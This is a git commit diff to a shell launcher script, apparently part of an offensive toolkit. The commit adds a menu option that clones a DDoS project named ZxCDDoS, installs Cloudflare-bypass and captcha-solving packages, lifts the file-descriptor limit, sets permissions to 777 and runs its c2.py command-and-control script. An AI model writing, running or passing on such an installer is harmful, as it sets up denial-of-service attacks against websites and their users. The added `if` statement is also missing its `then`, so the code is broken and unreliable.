e78697c3fca0f72468d11d5d3379edb0f32399a3
Hengker EpEp <167304514+THEOYS123@users.noreply.github.com>
2024-05-12 23:27:21 +0700

    Update ren999.sh

--- ren999.sh
+++ ren999.sh
@@ -742,6 +742,31 @@ make setup
 make Run
 fi
 
+if [ $ren9999 == 54 ]
+clear
+sleep 1
+git clone https://github.com/hoaan1995/ZxCDDoS/
+cd ZxCDDoS/
+npm i requests
+npm i https-proxy-agent
+npm i crypto-random-string
+npm i events
+npm i fs
+npm i net
+npm i cloudscraper
+npm i request
+npm i hcaptcha-solver
+npm i randomstring
+npm i cluster
+npm i cloudflare-bypasser
+pip3 install -r requirements.txt
+wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+apt-get install ./google-chrome-stable_current_amd64.deb
+ulimit -n 999999
+chmod 777 *
+python3 c2.py
+fi
+
 if [ $ren9999 == UPDATE ]
 then
 clear
